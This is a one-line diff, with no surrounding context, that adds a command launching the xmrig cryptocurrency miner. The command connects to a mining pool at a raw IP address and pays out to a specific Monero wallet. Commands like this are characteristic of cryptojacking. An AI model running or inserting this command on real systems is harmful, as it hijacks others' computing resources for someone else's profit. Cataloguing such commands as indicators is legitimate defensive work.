@@ -1,0 +1,1 @@
+xmrig.exe -o stratum+tcp://212.8.251.222:443 -u 45rATgNz92sAuiuHaNNspvBaJPh1C7bKTZ3vy9LdLTsfFae7eVnwA2U2v2z9qjZBtRKF9fuxMJVzQKiZ5MkG8iU96BjRBDc -p Cipro
